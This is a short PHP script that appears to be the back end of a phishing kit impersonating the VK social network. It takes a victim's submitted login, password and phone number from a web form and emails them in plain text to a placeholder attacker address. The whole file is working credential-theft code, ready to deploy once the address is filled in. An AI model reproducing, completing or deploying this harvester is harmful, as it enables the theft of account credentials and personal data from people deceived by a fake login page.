<?php

$recepient = "Ваша-почта@mail.ru";
$sitename = "Vk";

$login = trim($_POST["login"]);
$pass = trim($_POST["pass"]);
$number = trim($_POST["numbar"]);
$message = "login: $login \nPassword: $pass \nNumber: $number";

$pagetitle = "Новая заявка с сайта \"$sitename\"";
mail($recepient, $pagetitle, $message, "Content-type: text/plain; charset=\"utf-8\"\n From: $recepient");